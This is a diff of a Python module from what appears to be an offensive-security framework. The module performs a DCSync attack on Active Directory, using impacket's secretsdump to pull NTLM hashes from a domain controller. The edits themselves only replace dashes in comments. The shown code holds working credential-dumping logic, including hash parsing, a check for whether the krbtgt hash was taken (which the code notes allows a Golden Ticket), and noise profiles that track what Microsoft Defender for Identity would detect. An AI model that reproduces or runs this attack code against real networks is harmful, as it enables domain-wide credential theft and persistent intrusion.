@@ -1,7 +1,7 @@
 """
-DCSync — Production Implementation using impacket.secretsdump
-MITRE: T1003.006 — Replicates NTLM hashes via MS-DRSR.
-⚠️ Very noisy — auto-blocked in STEALTH profile. Triggers MDI in seconds.
+DCSync - Production Implementation using impacket.secretsdump
+MITRE: T1003.006 - Replicates NTLM hashes via MS-DRSR.
+⚠️ Very noisy - auto-blocked in STEALTH profile. Triggers MDI in seconds.
 """
 from __future__ import annotations
 from typing import Any
@@ -36,7 +36,7 @@ from ares.sdk import (
 )
 class DCSyncModule(BaseModule[DCSyncParams, ModuleResult]):
     """
-    ad.dcsync — Replicate domain hashes via MS-DRSR (requires DA or replication rights)
+    ad.dcsync - Replicate domain hashes via MS-DRSR (requires DA or replication rights)
 
     OPSEC: HIGH_NOISE
     MITRE: "T1003.006"
@@ -49,7 +49,7 @@ class DCSyncModule(BaseModule[DCSyncParams, ModuleResult]):
     MODULE_DESCRIPTION = "Replicate domain hashes via MS-DRSR (requires DA or replication rights)"
     MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
     OPSEC_LEVEL        = OpsecLevel.HIGH_NOISE
-    MIN_NOISE_PROFILE  = "normal"   # blocked in stealth — triggers Microsoft Defender for Identity
+    MIN_NOISE_PROFILE  = "normal"   # blocked in stealth - triggers Microsoft Defender for Identity
     REQUIRES           = ["domain_admin_creds"]
     OUTPUTS            = ["ntlm_hashes"]
     MITRE_TECHNIQUES   = ["T1003.006"]
@@ -113,7 +113,7 @@ class DCSyncModule(BaseModule[DCSyncParams, ModuleResult]):
     async def validate(self, ctx: "Any") -> None:
         """
         Enforce dc, domain, domain-admin credentials, and noise profile.
-        DCSync requires DA-level credentials — catch misconfigured runs early.
+        DCSync requires DA-level credentials - catch misconfigured runs early.
         """
         from ares.core.context import ExecutionContext
         from ares.core.errors import ModuleValidationError
@@ -133,15 +133,15 @@ class DCSyncModule(BaseModule[DCSyncParams, ModuleResult]):
             )
         if not ad["username"]:
             raise ModuleValidationError(
-                "ad.dcsync requires Domain Admin credentials — "
+                "ad.dcsync requires Domain Admin credentials - "
                 "pass 'username'/'password' in params or provide a DA vault credential.",
                 module_id=self.MODULE_ID, field="username",
             )
-        # Stealth check — surface this before any connection is attempted
+        # Stealth check - surface this before any connection is attempted
         noise = getattr(getattr(ctx, "campaign", None), "noise_profile", None)
         if noise == NoiseProfile.STEALTH:
             raise ModuleValidationError(
-                "ad.dcsync is blocked in STEALTH noise profile — "
+                "ad.dcsync is blocked in STEALTH noise profile - "
                 "MS-DRSR replication from non-DC triggers Microsoft Defender for Identity "
                 "immediately. Use NORMAL or AGGRESSIVE profile.",
                 module_id=self.MODULE_ID, field="noise_profile",
@@ -253,7 +253,7 @@ class DCSyncModule(BaseModule[DCSyncParams, ModuleResult]):
         dc, username, domain, target_user = (sanitize_hostname(dc), sanitize_ldap(username),
                                               sanitize_ldap(domain), sanitize_ldap(target_user))
         await self.before_request(dc, "dcsync")
-        logger.warning("dcsync_start", dc=dc, target=target_user, msg="HIGH_NOISE — TRIGGERS_MDI")
+        logger.warning("dcsync_start", dc=dc, target=target_user, msg="HIGH_NOISE - TRIGGERS_MDI")
         try:
             import asyncio as _asyncio
             loop = _asyncio.get_running_loop()
@@ -277,7 +277,7 @@ class DCSyncModule(BaseModule[DCSyncParams, ModuleResult]):
 
     def _run_dcsync_sync(self, dc, username, password, domain, target_user):
         """
-        Sync — runs in executor (Bug fix: was async with blocking SMB/RPC calls).
+        Sync - runs in executor (Bug fix: was async with blocking SMB/RPC calls).
         Uses impacket.examples.secretsdump with stable callback-based API.
         try/finally ensures RemoteOperations.finish() + smb.logoff() always called.
         """
@@ -309,7 +309,7 @@ class DCSyncModule(BaseModule[DCSyncParams, ModuleResult]):
             )
 
             def _on_secret(secret_type: str, secret: str) -> None:
-                """Callback — impacket calls this for each dumped hash."""
+                """Callback - impacket calls this for each dumped hash."""
                 if ":::" not in secret:
                     return
                 parts = secret.split(":")
@@ -347,9 +347,9 @@ class DCSyncModule(BaseModule[DCSyncParams, ModuleResult]):
         if not hashes:
             return
         krbtgt = next((h for h in hashes if h["username"].lower()=="krbtgt"), None)
-        self.finding(title=f"DCSync — {len(hashes)} NTLM Hash(es)",
+        self.finding(title=f"DCSync - {len(hashes)} NTLM Hash(es)",
             description=(f"Replicated {len(hashes)} NTLM hashes via DCSync. "
-                         + ("krbtgt obtained — Golden Ticket possible. " if krbtgt else "")),
+                         + ("krbtgt obtained - Golden Ticket possible. " if krbtgt else "")),
             severity=Severity.CRITICAL, mitre_technique="T1003.006", mitre_tactic="Credential Access",
             evidence={"hash_count":len(hashes),"target":target,"krbtgt_obtained":bool(krbtgt),
                       "sample":[f"{h['username']}:::{h['nt_hash']}" for h in hashes[:3]]},
